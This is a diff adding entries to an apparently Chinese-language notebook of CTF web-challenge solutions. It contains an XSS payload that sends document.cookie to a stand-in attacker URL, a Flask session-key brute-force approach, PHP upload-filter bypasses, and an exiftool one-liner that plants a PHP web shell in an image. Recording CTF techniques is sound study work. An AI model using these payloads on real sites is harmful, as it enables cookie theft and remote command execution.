@@ -2138,3 +2138,11 @@ SELECT * FROM table WHERE column LIKE '%${name}%';
 - CSP `default-src 'self'`阻挡了跨域fetch。如当前domain为`http://a.com`，fetch填写的url就只能是这个域名，`fetch("http://b.com")`会被浏览器阻挡。这种情况下的xss可以借助window.location将数据带出到webhook。`<script>window.location =ATTACKER_URL?x=document.cookie</script>`
 230. [complainer](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/complainer)
 - 利用url重定向（redirect）实现xss。这题的非预期解在于/login路由会重定向：`/login?next=url`。即使能提交给admin bot的url只能是同域的，但是可以更改重定向的url为`javascript: url`，即可让bot执行任意js代码。
+231. [CryptoMarket](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#cryptomarket)
+- 使用curl发送HEAD请求：`curl -I <url> -vv`。也可使用python request库(获取cookie)：`request.head("url").cookies.get_dict()['name']`
+- 构建字典并使用模块化的[flask unsign](https://pypi.org/project/flask-unsign/)爆破flask session SECRET_KEY
+232. [Dumb Admin](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#dumb-admin)
+- php文件上传基础绕过：https://book.hacktricks.xyz/pentesting-web/file-upload 。当shell.php的后缀不允许时，尝试用shell.png.php绕过（随便在前面加个符合上传要求的后缀）
+- php exif_imagetype函数绕过：
+     - 在shell文件前加上jpg文件头ffd8ffee
+     - 将shell使用exiftool插入图片的comment中：`exiftool -Comment="<?php system(\$_GET['cmd']) ?>" image.jpg` https://m44lr0m.vercel.app/writeups/dantectf-2023-web-challenges
